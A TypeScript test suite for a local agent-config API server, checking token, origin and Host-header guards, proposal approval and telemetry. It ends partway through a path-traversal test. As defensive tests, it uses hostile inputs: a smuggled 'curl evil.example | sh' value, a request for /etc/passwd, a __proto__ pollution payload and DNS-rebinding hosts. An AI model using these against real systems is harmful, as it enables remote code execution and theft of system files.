/**
 * The API server, driven over real HTTP.
 *
 * server.ts had no tests at all — 0% of 166 lines — which for the process that
 * reads and writes the agent config, serves the visualiser and ingests
 * telemetry is the least defensible gap in the repo. It boots as a child
 * process here because that is the only way its own startup, routing and
 * static path handling are the thing under test rather than a re-implementation
 * of them.
 */
import { type ChildProcess, execFileSync, spawn, spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { request } from 'node:http';
import { createServer } from 'node:net';
import { DatabaseSync } from 'node:sqlite';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterAll, beforeAll, expect, test } from 'vitest';
import { getDb } from '../engine/db.ts';
import { recordFrontier } from '../engine/ledger.ts';

/** `Response.json()` is `unknown` under TypeScript 7; these read fields off it. */
const json = async (r: Response): Promise<any> => await r.json();

const ROOT = join(import.meta.dirname, '..', '..');
const TOKEN = 'b'.repeat(64);

/**
 * The dev page's port, as `npm run dev` hands it to the API in AMBIT_WEB_PORT.
 * Not 3000, so a test that passes proves the port came from the variable.
 */
const WEB_PORT = 4317;

/** The page itself: a request from the page's origin needs no token. */
const PAGE = { Origin: `http://localhost:${WEB_PORT}` };

/** One telemetry observation, posted with whatever `headers` say. */
const report = (body: unknown, headers: Record<string, string> = { 'X-Ambit-Token': TOKEN }) =>
  fetch(`${base}/api/telemetry`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body),
  });

/** One proposal decided the way a card's button does it, from wherever `headers` say. */
const decide = (
  id: string,
  decision: 'approve' | 'reject',
  body: unknown,
  headers: Record<string, string> = PAGE
) =>
  fetch(`${base}/api/proposals/${id}/${decision}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body),
  });

let dir: string;
let server: ChildProcess;
let base: string;

const freePort = (): Promise<number> =>
  new Promise(resolve => {
    const s = createServer();
    s.listen(0, '127.0.0.1', () => {
      const { port } = s.address() as { port: number };
      s.close(() => resolve(port));
    });
  });

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), 'ambit-api-'));
  const configPath = join(dir, 'opencode.json');
  writeFileSync(
    configPath,
    JSON.stringify({ mcp: { git: { type: 'local', enabled: true } }, agent: {} })
  );
  const dbPath = join(dir, 'graph.db');
  const env = {
    ...process.env,
    AMBIT_DB: dbPath,
    TOOLCHAIN_DB: dbPath,
    OPENCODE_CONFIG: configPath,
    INFRA_MANIFEST: join(dir, 'none.json'),
    AMBIT_API_TOKEN: TOKEN,
    // An approval signs with this, so no test reads or creates the real key.
    AMBIT_APPROVAL_KEY: 'api-test-approval-key',
    NODE_NO_WARNINGS: '1',
  };
  execFileSync(
    'node',
    ['--experimental-sqlite', join(ROOT, 'src', 'engine', 'engine.ts'), 'seed'],
    {
      env,
      stdio: 'ignore',
    }
  );

  const port = await freePort();
  base = `http://127.0.0.1:${port}`;
  server = spawn('node', ['--experimental-sqlite', join(ROOT, 'src', 'server', 'api.ts')], {
    env: { ...env, AMBIT_API_PORT: String(port), AMBIT_WEB_PORT: String(WEB_PORT) },
    cwd: ROOT,
    stdio: 'ignore',
  });

  for (let i = 0; i < 80; i++) {
    try {
      if ((await fetch(`${base}/api/health`)).ok) return;
    } catch {
      /* not up yet */
    }
    await new Promise(r => setTimeout(r, 100));
  }
  throw new Error('the API server never came up');
}, 30_000);

afterAll(() => {
  server?.kill('SIGKILL');
  rmSync(dir, { recursive: true, force: true });
});

test('health reports the paths it resolved, so a misconfigured run is legible', async () => {
  const r = await fetch(`${base}/api/health`);
  const body = await json(r);
  expect(r.status).toBe(200);
  expect(body.status).toBe('ok');
  expect(body.configExists).toBe(true);
});

test('the loop carries the governance half: authority, next steps, movement', async () => {
  const r = await fetch(`${base}/api/loop`);
  const body = await json(r);
  expect(r.status).toBe(200);
  expect(typeof body.authority.autonomous).toBe('number');
  expect(Array.isArray(body.authority.promotable)).toBe(true);
  expect(Array.isArray(body.next)).toBe(true);
  expect('since' in body).toBe(true);
});

test('the browser can decide either way, and the graph knows who decided', async () => {
  // Approval from the panel failed on every machine that had not declared a
  // `web` actor by hand, and refusal had no route at all. Both declare the
  // person at the loopback port and record the decision.
  execFileSync(
    'node',
    [
      '--experimental-sqlite',
      join(ROOT, 'src', 'engine', 'engine.ts'),
      'propose',
      'local-embeddings',
    ],
    {
      env: {
        ...process.env,
        AMBIT_DB: join(dir, 'graph.db'),
        OPENCODE_CONFIG: join(dir, 'opencode.json'),
      },
      stdio: 'ignore',
    }
  );
  const list = await json(await fetch(`${base}/api/proposals`));
  const drafts = list.proposals.filter((p: any) => p.status === 'draft');
  expect(drafts.length).toBeGreaterThan(0);
  expect(drafts[0].decision).toBeDefined();

  const rejected = await decide(drafts[0].id, 'reject', {
    proposalHash: drafts[0].proposal_hash,
    reason: 'not this quarter',
  });
  expect(rejected.status).toBe(200);
  const body = await json(rejected);
  expect(body.rejected_by).toBe('human:web');
  expect(body.reason).toBe('not this quarter');

  const after = await json(await fetch(`${base}/api/proposals`));
  expect(after.proposals.find((p: any) => p.id === drafts[0].id).status).toBe('rejected');
});

test('the briefing the agent is given can be read by the person', async () => {
  const r = await fetch(`${base}/api/briefing`);
  const body = await json(r);
  expect(r.status).toBe(200);
  expect(body.text).toContain('Ambit ·');
  expect(body.budget).toBeGreaterThan(0);
});

test('the graph is served in the shape the client renders', async () => {
  const r = await fetch(`${base}/api/tech-tree`);
  const body = await json(r);
  expect(r.status).toBe(200);
  expect(body.items.length).toBeGreaterThan(0);
  // The contract in src/shared/api.ts: a renderable type and a meta block.
  for (const item of body.items.slice(0, 20)) {
    expect(typeof item.id).toBe('string');
    expect(typeof item.meta.domain).toBe('string');
    expect(['built', 'specified']).toContain(item.status);
  }
});

test('reading the config needs the token when the caller is not a browser', async () => {
  expect((await fetch(`${base}/api/config`)).status).toBe(401);
  expect(
    (await fetch(`${base}/api/config`, { headers: { 'X-Ambit-Token': 'wrong' } })).status
  ).toBe(401);
  const ok = await fetch(`${base}/api/config`, { headers: { 'X-Ambit-Token': TOKEN } });
  expect(ok.status).toBe(200);
  expect((await json(ok)).config.mcp.git).toBeDefined();
});

test('a foreign origin is refused before routing, not merely un-CORSed', async () => {
  // CORS headers only stop a browser *reading* the reply; a simple request is
  // still delivered and executed. The rejection has to be the request itself.
  const r = await fetch(`${base}/api/tech-tree`, { headers: { Origin: 'https://evil.example' } });
  expect(r.status).toBe(403);
});

test('a page on another port of this machine is refused on every guarded route, token or not', async () => {
  // Every page on this machine is on localhost. Judging the name alone let
  // another project's dev server, or `python -m http.server` in a downloaded
  // folder, read the config, switch a server on in it, sign approvals as the
  // person at the page and record the uses that promote a grant.
  const configPath = join(dir, 'opencode.json');
  const before = readFileSync(configPath, 'utf8');
  drafts('prop-port');
  const { items } = await shown('prop-port');
  const own = Number(new URL(base).port);
  const elsewhere = [
    'http://localhost:3000',
    `http://localhost:${WEB_PORT + 1}`,
    `http://127.0.0.1:${own + 1}`,
    `http://[::1]:${own - 1}`,
    // No port is 80, which is neither of this app's.
    'http://localhost',
  ];
  for (const origin of elsewhere) {
    const asked: Record<string, string>[] = [
      { Origin: origin },
      { Origin: origin, 'X-Ambit-Token': TOKEN },
    ];
    for (const headers of asked) {
      const read = await fetch(`${base}/api/config`, { headers });
      // Refused before routing, and no CORS grant for the page to read it by.
      expect(read.headers.get('access-control-allow-origin')).toBeNull();
      const said = [
        read.status,
        (
          await fetch(`${base}/api/config/apply`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', ...headers },
            body: JSON.stringify({ disableMcp: ['git'] }),
          })
        ).status,
        (await decide('prop-port', 'approve', { proposalHash: items[0].proposalHash }, headers))
          .status,
        (await queue('approve', { items }, headers)).status,
        (await report({ run: { id: 'run-wrong-port', goal: 'x', runType: 'task' } }, headers))
          .status,
      ];
      expect([origin, said]).toEqual([origin, [403, 403, 403, 403, 403]]);
    }
  }
  expect(readFileSync(configPath, 'utf8')).toBe(before);
  expect(((await shown()).byId.get('prop-port') as any).status).toBe('draft');
  expect((await fetch(`${base}/api/run?id=run-wrong-port`)).status).toBe(404);
});

test('a page is accepted from the API’s own port and the dev page’s, by any name for this machine', async () => {
  // The installed copy serves its page from the API's port, and a browser sends
  // an Origin on a same-origin POST; Vite passes its page's Origin through.
  const own = new URL(base).port;
  const pages = [
    `http://127.0.0.1:${own}`,
    `http://localhost:${own}`,
    `http://localhost:${WEB_PORT}`,
    `http://127.0.0.1:${WEB_PORT}`,
    `http://[::1]:${WEB_PORT}`,
  ];
  for (const [i, origin] of pages.entries()) {
    const read = await fetch(`${base}/api/config`, { headers: { Origin: origin } });
    expect([origin, read.status]).toEqual([origin, 200]);
    expect(read.headers.get('access-control-allow-origin')).toBe(origin);
    const run = { run: { id: `run-page-${i}`, goal: 'from the page', runType: 'task' } };
    expect([origin, (await report(run, { Origin: origin })).status]).toEqual([origin, 200]);
  }
});

test('the config editor changes only what it is allowed to', async () => {
  const r = await fetch(`${base}/api/config/apply`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-Ambit-Token': TOKEN },
    // The last two must be ignored: creating an entry is how an HTTP request
    // would become code execution, and __proto__ is how it would become worse.
    body: JSON.stringify({
      disableMcp: ['git'],
      updateAgent: { name: 'nonexistent', updates: { description: 'x' } },
      // Deliberately hostile input.
      ...({ enableMcp: ['__proto__'] } as Record<string, unknown>),
    }),
  });
  expect(r.status).toBe(200);

  const after = await json(
    await fetch(`${base}/api/config`, { headers: { 'X-Ambit-Token': TOKEN } })
  );
  expect(after.config.mcp.git.enabled).toBe(false);
  expect(after.config.agent.nonexistent).toBeUndefined();
  expect(({} as Record<string, unknown>).enabled).toBeUndefined();
});

test('an edit from the visualiser keeps the config it replaced in a .bak', async () => {
  // SECURITY.md says the config editing writes a `.bak` first. Only `ambit
  // apply` did, so the promise held for the terminal and not for the browser.
  const configPath = join(dir, 'opencode.json');
  const edit = (body: object) =>
    fetch(`${base}/api/config/apply`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Ambit-Token': TOKEN },
      body: JSON.stringify(body),
    });

  // Whichever way git stands, flip it: an edit that changed nothing would
  // leave a backup identical to the config, and prove nothing about the copy.
  const before = readFileSync(configPath, 'utf8');
  const was = JSON.parse(before).mcp.git.enabled;
  expect((await edit(was ? { disableMcp: ['git'] } : { enableMcp: ['git'] })).status).toBe(200);

  const after = readFileSync(configPath, 'utf8');
  expect(JSON.parse(after).mcp.git.enabled).toBe(!was);
  expect(readFileSync(`${configPath}.bak`, 'utf8')).toBe(before);

  // Put it back, and the backup moves with the edit: it is the config before
  // the latest one, not the first.
  expect((await edit(was ? { enableMcp: ['git'] } : { disableMcp: ['git'] })).status).toBe(200);
  expect(readFileSync(`${configPath}.bak`, 'utf8')).toBe(after);
});

test('switching a server the config does not have changes nothing and creates nothing', async () => {
  // The page offers its switch only for servers the config holds, because this
  // route answers ok for a name it has no entry for. That answer is a no-op and
  // has to stay one: an entry an HTTP request could create is an entry that a
  // runtime would later execute.
  const configPath = join(dir, 'opencode.json');
  const before = JSON.parse(readFileSync(configPath, 'utf8'));
  for (const body of [{ enableMcp: ['nonesuch'] }, { disableMcp: ['nonesuch'] }]) {
    const r = await fetch(`${base}/api/config/apply`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Ambit-Token': TOKEN },
      body: JSON.stringify(body),
    });
    expect(r.status).toBe(200);
  }
  const after = JSON.parse(readFileSync(configPath, 'utf8'));
  expect(after.mcp.nonesuch).toBeUndefined();
  expect(after.mcp).toEqual(before.mcp);
});

test('an OpenCode 2 config is read out in V1 names and edited in its own', async () => {
  const configPath = join(dir, 'opencode.json');
  const original = readFileSync(configPath, 'utf8');
  const call = (path: string, body?: object) =>
    fetch(`${base}${path}`, {
      method: body ? 'POST' : 'GET',
      headers: { 'Content-Type': 'application/json', 'X-Ambit-Token': TOKEN },
      body: body ? JSON.stringify(body) : undefined,
    });
  try {
    writeFileSync(
      configPath,
      JSON.stringify({
        mcp: { servers: { git: { type: 'local', command: ['git-mcp'], disabled: false } } },
        agents: { writer: { description: 'old' } },
      })
    );
    // The page reads servers and agents by their V1 names.
    const read = await json(await call('/api/config'));
    expect(Object.keys(read.config.mcp)).toEqual(['git']);
    expect(read.config.mcp.git.enabled).toBe(true);
    expect(read.config.agent.writer.description).toBe('old');

    expect(
      (
        await call('/api/config/apply', {
          disableMcp: ['git'],
          updateAgent: { name: 'writer', updates: { description: 'new' } },
        })
      ).status
    ).toBe(200);
    // Written back in V2's words, and no V1 field left behind in a V2 file.
    const file = JSON.parse(readFileSync(configPath, 'utf8'));
    expect(file.mcp.servers.git).toEqual({ type: 'local', command: ['git-mcp'], disabled: true });
    expect(file.mcp.git).toBeUndefined();
    expect(file.agents.writer.description).toBe('new');
    expect(file.agent).toBeUndefined();

    // The snippet a person pastes fits the file it goes into.
    const snip = await json(await call('/api/config/mcp-snippet', { name: 'x', config: {} }));
    expect(JSON.parse(snip.snippet)).toEqual({ mcp: { servers: { x: { disabled: false } } } });

    // A commented file is read, and an edit that would delete the comments is refused.
    const commented = `{
  // mine
  "mcp": { "git": { "type": "local", "enabled": true } }
}`;
    writeFileSync(configPath, commented);
    expect((await json(await call('/api/config'))).config.mcp.git.enabled).toBe(true);
    expect((await call('/api/config/apply', { disableMcp: ['git'] })).status).toBe(409);
    expect(readFileSync(configPath, 'utf8')).toBe(commented);
  } finally {
    writeFileSync(configPath, original);
  }
});

test('telemetry needs the token when no browser is behind it', async () => {
  // A use recorded in a run that ended in success counts toward a promotion
  // threshold a person set, so an open route let anything that could post here
  // push a grant across it. Refused means recorded nowhere.
  const run = { run: { id: 'run-test', goal: 'a task', runType: 'task' } };
  expect((await report(run, {})).status).toBe(401);
  expect((await report(run, { 'X-Ambit-Token': 'wrong' })).status).toBe(401);
  expect((await fetch(`${base}/api/run?id=run-test`)).status).toBe(404);

  expect((await report(run)).status).toBe(200);
  expect((await fetch(`${base}/api/run?id=run-test`)).status).toBe(200);
});

test('the stdin adapter presents the token the server made, and records nothing without it', async () => {
  const home = mkdtempSync(join(tmpdir(), 'ambit-adapter-home-'));
  const adapter = (runId: string) =>
    spawnSync(
      'node',
      ['--experimental-strip-types', join(ROOT, 'scripts', 'adapters', 'telemetry.ts')],
      {
        input: `${JSON.stringify({ run: { id: runId, goal: 'piped', runType: 'task' } })}\n`,
        // No token in the environment: the adapter has to find the file.
        env: { ...process.env, HOME: home, AMBIT_SERVER: base, AMBIT_API_TOKEN: '' },
        encoding: 'utf8',
      }
    );
  try {
    const refused = adapter('run-adapter-none');
    expect(refused.stderr).toContain('telemetry 401');
    expect((await fetch(`${base}/api/run?id=run-adapter-none`)).status).toBe(404);

    // The server checks AMBIT_API_TOKEN here; the file is where a real one keeps it.
    const tokenFile = join(home, '.config', 'opencode', 'ambit-api.token');
    mkdirSync(dirname(tokenFile), { recursive: true });
    writeFileSync(tokenFile, `${TOKEN}\n`, { mode: 0o600 });
    const sent = adapter('run-adapter');
    expect(sent.stderr).not.toContain('telemetry 401');
    expect((await fetch(`${base}/api/run?id=run-adapter`)).status).toBe(200);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

/** Drafts written into the test graph the way a propose leaves them. */
function drafts(...ids: string[]) {
  const db = new DatabaseSync(join(dir, 'graph.db'));
  db.exec('PRAGMA busy_timeout = 5000');
  const insert = db.prepare(
    "INSERT INTO proposals (id, goal, status, steps, simulated) VALUES (?, ?, 'draft', '[]', '{}')"
  );
  for (const id of ids) insert.run(id, `reach what ${id} names`);
  db.close();
}

/** The proposals as the page reads them, and each one's shown hash. */
async function shown(...ids: string[]) {
  const { proposals } = await json(await fetch(`${base}/api/proposals`));
  const byId = new Map(proposals.map((p: any) => [p.id, p]));
  return {
    byId,
    items: ids.map(id => ({ id, proposalHash: (byId.get(id) as any).proposal_hash })),
  };
}

const queue = (decision: 'approve' | 'reject', body: unknown, headers: Record<string, string>) =>
  fetch(`${base}/api/proposals/${decision}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body),
  });

test('approving one draft signs it as the person at the page and applies nothing', async () => {
  drafts('prop-one');
  const { items } = await shown('prop-one');
  const r = await decide('prop-one', 'approve', { proposalHash: items[0].proposalHash });
  expect(r.status).toBe(200);
  const body = await json(r);
  expect(body.approved_by).toBe('human:web');
  expect(body.artifact.sig).toMatch(/^[0-9a-f]{64}$/);
  const { byId } = await shown();
  expect(byId.get('prop-one')).toMatchObject({ status: 'approved', applied_at: null });
});

test('a decision on one proposal is the person at the page, whoever the body claims to be', async () => {
  // The body used to name the actor, so anything that could make a loopback
  // request signed an approval as any person the graph knew, and the control
  // plane accepts a signed artifact for the person it asks for.
  const db = new DatabaseSync(join(dir, 'graph.db'));
  db.exec('PRAGMA busy_timeout = 5000');
  db.prepare(
    "INSERT OR IGNORE INTO capabilities (id, name, domain, description, category, state, maturity_score, kind) VALUES ('human:security-lead', 'the security lead', 'social', 'declared', 'human', 'active', 1.0, 'actor')"
  ).run();
  db.close();
  drafts('prop-who');
  const { items } = await shown('prop-who');

  const r = await decide('prop-who', 'approve', {
    proposalHash: items[0].proposalHash,
    actor: 'human:security-lead',
  });
  expect(r.status).toBe(200);
  const body = await json(r);
  expect(body.approved_by).toBe('human:web');
  expect(body.artifact.actor).toBe('human:web');
});

test('a decision on one proposal needs the token when no browser is behind it', async () => {
  drafts('prop-tok');
  const { items } = await shown('prop-tok');
  const body = { proposalHash: items[0].proposalHash };

  for (const decision of ['approve', 'reject'] as const) {
    expect((await decide('prop-tok', decision, body, {})).status).toBe(401);
  }
  expect(((await shown()).byId.get('prop-tok') as any).status).toBe('draft');
  expect((await decide('prop-tok', 'approve', body, { 'X-Ambit-Token': TOKEN })).status).toBe(200);
});

test('a decision on one proposal is made on what was shown, so a stale card decides nothing', async () => {
  drafts('prop-stale');
  const { items } = await shown('prop-stale');

  // No hash, or the wrong one, is refused and leaves the draft as it was.
  const none = await decide('prop-stale', 'approve', {});
  expect(none.status).toBe(400);
  expect((await json(none)).error).toContain('proposalHash');
  const wrong = await decide('prop-stale', 'approve', { proposalHash: 'not-the-hash' });
  expect(wrong.status).toBe(409);
  expect(((await shown()).byId.get('prop-stale') as any).status).toBe('draft');

  // Approved by someone else while the card was open: turning it down would have
  // recorded a refusal over an approval and left its artifact standing.
  await decide('prop-stale', 'approve', { proposalHash: items[0].proposalHash });
  const late = await decide('prop-stale', 'reject', { proposalHash: items[0].proposalHash });
  expect(late.status).toBe(409);
  expect(((await shown()).byId.get('prop-stale') as any).status).toBe('approved');
});

/** A GET with a Host header of its own, which `fetch` will not let a script set. */
const askAs = (host: string, path: string, headers: Record<string, string> = {}) =>
  new Promise<{ status: number; body: string }>((resolve, reject) => {
    const req = request(
      { host: '127.0.0.1', port: new URL(base).port, path, headers: { host, ...headers } },
      res => {
        let body = '';
        res.on('data', chunk => {
          body += chunk;
        });
        res.on('end', () => resolve({ status: res.statusCode ?? 0, body }));
      }
    );
    req.on('error', reject);
    req.end();
  });

test('a request addressed to any name but this machine is refused before routing', async () => {
  // A page that rebinds its own name to 127.0.0.1 is the same origin as this
  // server: no Origin on a read, `Sec-Fetch-Site: same-origin`, and the
  // token rule waves it through. Only the name it asked for gives it away.
  const rebound = { 'sec-fetch-site': 'same-origin' };
  for (const path of ['/api/health', '/api/config', '/api/audit', '/api/frontier', '/api/run']) {
    const r = await askAs('attacker.example:3001', path, rebound);
    expect([path, r.status]).toEqual([path, 403]);
    expect(r.body).not.toContain('mcp');
  }
  // Nothing about the rest of the request makes up for it.
  expect(
    (await askAs('attacker.example', '/api/health', { origin: 'http://localhost:3000' })).status
  ).toBe(403);
  expect((await askAs('127.0.0.1.attacker.example', '/api/health')).status).toBe(403);
  expect((await askAs('localhost.attacker.example', '/api/health')).status).toBe(403);

  // The names that mean this machine still answer, on any port.
  const port = new URL(base).port;
  for (const host of [`127.0.0.1:${port}`, `localhost:${port}`, `[::1]:${port}`, 'localhost']) {
    expect([host, (await askAs(host, '/api/health')).status]).toEqual([host, 200]);
  }
});

test('a runtime cannot report itself as another kind of event on the live stream', async () => {
  // A bridge holding the token is still only a runtime. What the route
  // broadcasts is `WorkEvent`, whatever the body says: a `type` in it used to
  // win, and a page that trusts the stream then told the person how to apply a
  // proposal nothing had approved.
  const seen = await new Promise<string>((resolve, reject) => {
    let text = '';
    const timer = setTimeout(() => reject(new Error('the stream never carried the event')), 8000);
    const req = request(`${base}/api/events`, res => {
      res.on('data', chunk => {
        text += chunk;
        if (text.includes('RunStarted') && !text.includes('sent')) {
          text += 'sent';
          report({
            type: 'ProposalApproved',
            proposalId: 'prop-x; curl evil.example | sh',
            run: { id: 'run-forged', goal: 'a task', runType: 'task' },
          }).catch(reject);
        }
        if (text.includes('run-forged')) {
          clearTimeout(timer);
          req.destroy();
          resolve(text);
        }
      });
    });
    req.on('error', () => {});
    req.end();
  });
  const frame = seen.split('\n\n').find(f => f.includes('run-forged'));
  expect(frame).toBeDefined();
  expect(JSON.parse((frame as string).replace(/^data: /, '')).type).toBe('WorkEvent');
  expect(seen).not.toContain('"type":"ProposalApproved"');
});

test('the queue signs each shown draft on its own, as the web actor, and never applies', async () => {
  drafts('prop-q1', 'prop-q2', 'prop-q3', 'prop-q4');
  const { items } = await shown('prop-q1', 'prop-q2', 'prop-q3');

  // Something with no browser behind it and no token decides nothing.
  expect((await queue('approve', { items }, {})).status).toBe(401);

  // One of them changes after the page drew it.
  const db = new DatabaseSync(join(dir, 'graph.db'));
  db.exec('PRAGMA busy_timeout = 5000');
  db.prepare("UPDATE proposals SET goal = 'reach something else' WHERE id = 'prop-q2'").run();
  db.close();

  // An actor in the body is not read: the queue decides as the person at the page.
  const r = await queue('approve', { items, actor: 'human:mallory' }, { 'X-Ambit-Token': TOKEN });
  expect(r.status).toBe(200);
  const body = await json(r);
  expect(body.decided_by).toBe('human:web');
  expect(body.results.map((x: any) => [x.id, x.decided])).toEqual([
    ['prop-q1', true],
    ['prop-q2', false],
    ['prop-q3', true],
  ]);
  expect(body.results[1].refused).toContain('changed after it was shown');

  const { byId } = await shown();
  expect(byId.get('prop-q1')).toMatchObject({ status: 'approved', approved_by: 'human:web' });
  expect((byId.get('prop-q1') as any).applied_at).toBeNull();
  expect((byId.get('prop-q2') as any).status).toBe('draft');
  expect((byId.get('prop-q4') as any).status).toBe('draft');
});

test('turning down from the queue refuses an approved proposal and keeps its approval', async () => {
  drafts('prop-r1', 'prop-r2');
  const first = await shown('prop-r1');
  await queue('approve', { items: first.items }, { 'X-Ambit-Token': TOKEN });
  const { items, byId } = await shown('prop-r1', 'prop-r2');
  const artifact = (byId.get('prop-r1') as any).approval_artifact;
  expect(artifact).toBeTruthy();

  // The page itself, on its own origin, needs no token.
  const r = await queue('reject', { items }, PAGE);
  expect(r.status).toBe(200);
  const body = await json(r);
  expect(body.results[0]).toMatchObject({ id: 'prop-r1', decided: false });
  expect(body.results[0].refused).toContain('only a draft can be decided');
  expect(body.results[1]).toEqual({ id: 'prop-r2', decided: true });

  const after = await shown();
  expect(after.byId.get('prop-r1')).toMatchObject({
    status: 'approved',
    approval_artifact: artifact,
  });
  expect((after.byId.get('prop-r2') as any).status).toBe('rejected');

  // A list it cannot read is refused whole.
  expect((await queue('reject', { items: [] }, { 'X-Ambit-Token': TOKEN })).status).toBe(400);
});

test('the trail is one stream, newest first, with an outcome only where one was recorded', async () => {
  const post = (body: unknown) => report(body);
  await post({ run: { id: 'run-audit', goal: 'audit me', runType: 'task' } });
  await post({ end: { runId: 'run-audit', outcome: 'completed' } });

  const r = await fetch(`${base}/api/audit`);
  const body = await json(r);
  expect(r.status).toBe(200);
  expect(body.days).toBe(30);
  const times = body.events.map((e: any) => e.at);
  expect(times).toEqual([...times].sort().reverse());
  const of = (action: string) =>
    body.events.find((e: any) => e.target === 'run-audit' && e.action === action);
  expect(of('ended').outcome).toEqual({ word: 'completed', tone: 'good' });
  expect('outcome' in of('started')).toBe(false);

  // It reads the ledger and writes nothing, so there is nothing to POST to.
  expect((await fetch(`${base}/api/audit`, { method: 'POST' })).status).toBe(404);
});

test('the frontier through time is read, one tick per observation, in the terminal’s words', async () => {
  const r = await fetch(`${base}/api/frontier`);
  const body = await json(r);
  expect(r.status).toBe(200);
  // The seed recorded one observation, and the first says so.
  expect(body.ticks).toHaveLength(1);
  expect(body.ticks[0].moved).toMatch(/^first observation, reached \d+$/);
  expect(Object.keys(body.ticks[0].states).length).toBeGreaterThan(0);
  expect('movedSinceLast' in body).toBe(true);

  // An observation dated before the seed's is a second tick, and the step
  // between the two reads as `ambit history since` prints it.
  const db = getDb(join(dir, 'graph.db'));
  recordFrontier(db, '2026-01-01 00:00:00');
  db.close();
  const after = await json(await fetch(`${base}/api/frontier`));
  expect(after.ticks).toHaveLength(2);
  const [first, second] = after.ticks;
  expect(first.at).toBe('2026-01-01 00:00:00');
  const terminal = JSON.parse(
    execFileSync(
      'node',
      [
        '--experimental-sqlite',
        join(ROOT, 'src', 'engine', 'engine.ts'),
        'history',
        'since',
        first.at,
        second.at,
        '--json',
      ],
      {
        env: { ...process.env, AMBIT_DB: join(dir, 'graph.db'), NODE_NO_WARNINGS: '1' },
        encoding: 'utf8',
      }
    )
  );
  expect(second.moved).toBe(terminal.moved);

  // Reading history is still behind the origin rule every route is.
  const foreign = await fetch(`${base}/api/frontier`, {
    headers: { Origin: 'https://evil.example' },
  });
  expect(foreign.status).toBe(403);
});

test('a run is served in time from what the ledger recorded, and reading it records nothing', async () => {
  const post = (body: unknown) => report(body);
  await post({ run: { id: 'run-timeline', goal: 'a timed run', runType: 'task' } });
  await post({ event: { runId: 'run-timeline', kind: 'tool', action: 'bash', actor: 'agent' } });
  await post({
    use: { runId: 'run-timeline', capabilityId: 'combo:shell-execution', durationSeconds: 30 },
  });
  // One ask whose reply was recorded, and one the way the plugin leaves it.
  await post({
    intervention: {
      runId: 'run-timeline',
      actorId: 'human:operator',
      kind: 'authority',
      startedAt: '2026-09-29 10:00:00',
      endedAt: '2026-09-29 10:02:00',
    },
  });
  await post({
    intervention: {
      runId: 'run-timeline',
      actorId: 'human:operator',
      kind: 'authority',
      action: 'bash',
      outcome: 'asked',
    },
  });

  const r = await fetch(`${base}/api/run?id=run-timeline`);
  const body = await json(r);
  expect(r.status).toBe(200);
  expect(body.run).toMatchObject({ id: 'run-timeline', goal: 'a timed run', ended_at: null });
  expect(body.run.uses[0]).toMatchObject({ capability: 'Shell Execution', seconds: 30 });
  expect(body.run.events).toHaveLength(1);
  expect(body.run.asks.map((a: any) => [a.gate, a.seconds])).toEqual([
    [true, 120],
    [true, null],
  ]);
  // One counted, one said not to be: an unmeasured ask is not a wait of nothing.
  expect(body.run.human).toEqual({ seconds: 120, timed: 1, untimed: 1 });
  expect(body.recent.map((s: any) => s.id)).toContain('run-timeline');

  // With no id it is the newest run that recorded an ask, and it is the same one.
  const latest = await json(await fetch(`${base}/api/run`));
  expect(latest.run.id).toBe('run-timeline');

  // A run nobody recorded is a 404 in the usual error shape.
  const missing = await fetch(`${base}/api/run?id=nonesuch`);
  expect(missing.status).toBe(404);
  expect((await json(missing)).error).toContain('nonesuch');

  // Reading is not writing: the same request twice sees the same ledger.
  const again = await json(await fetch(`${base}/api/run?id=run-timeline`));
  expect(again).toEqual(body);
});

test('a use may name its tool, and the engine says what the tool exercises', async () => {
  // How the OpenCode plugin posts a call: the tool's name, and its start and
  // length when it saw them. Which capabilities that is, the bridge never says.
  await report({ run: { id: 'run-tool-use', goal: 'tools, timed', runType: 'task' } });
  const use = (extra: Record<string, unknown>) =>
    report({ use: { runId: 'run-tool-use', tool: 'mcp__git__status', ...extra } }).then(json);
  const timed = await use({ durationSeconds: 2.5, at: '2026-09-29 10:00:00' });
  expect(timed.capabilities.length).toBeGreaterThan(0);
  // A length that is not a number of seconds is left off, not stored as one.
  await use({ durationSeconds: 'soon' });
  await use({});
  const unknown = await report({ use: { runId: 'run-tool-use', tool: 'nothing-known' } });
  expect((await json(unknown)).capabilities).toEqual([]);

  const run = (await json(await fetch(`${base}/api/run?id=run-tool-use`))).run;
  const n = timed.capabilities.length;
  expect(run.uses_total).toBe(3 * n);
  expect(run.uses.map((u: any) => u.seconds)).toEqual([
    ...Array(n).fill(2.5),
    ...Array(2 * n).fill(null),
  ]);
  expect(run.uses[0].at).toBe('2026-09-29T10:00:00.000Z');
});

test('the infrastructure scan says what an agent may do on each machine it found', async () => {
  // The manifest is read per request, so writing it here is what the next scan sees.
  const manifest = join(dir, 'none.json');
  writeFileSync(
    manifest,
    JSON.stringify({
      devices: [
        { id: 'nuc', name: 'NUC' },
        { id: 'gpu-box', name: 'GPU box' },
      ],
    })
  );
  try {
    const r = await fetch(`${base}/api/infrastructure/scan`);
    const body = await json(r);
    expect(r.status).toBe(200);
    expect(typeof body.generatedAt).toBe('string');

    for (const id of ['nuc', 'gpu-box']) {
      const machine = body.machines.find((m: any) => m.id === id);
      expect(machine.target).toBe(`device:${id}`);
      // The seeded tree's standing grants, asked of the gate for this target.
      const said = Object.fromEntries(machine.actions.map((a: any) => [a.name, a.decision]));
      expect(said).toEqual({
        install_package: 'CONFIRM',
        read_output: 'ALLOW',
        run_command: 'CONFIRM',
      });
    }
    // Each machine in the scan is in the answer, and only the machines.
    const devices = body.nodes.filter((n: any) => n.kind === 'device').map((n: any) => n.id);
    expect(body.machines.map((m: any) => m.id).sort()).toEqual([...devices].sort());
  } finally {
    rmSync(manifest, { force: true });
  }
});

test('an unknown path is a 404, and cannot escape dist/', async () => {
  expect((await fetch(`${base}/api/nope`)).status).toBe(404);
  const traversal = await fetch(`${base}/../../../../etc/passwd`);
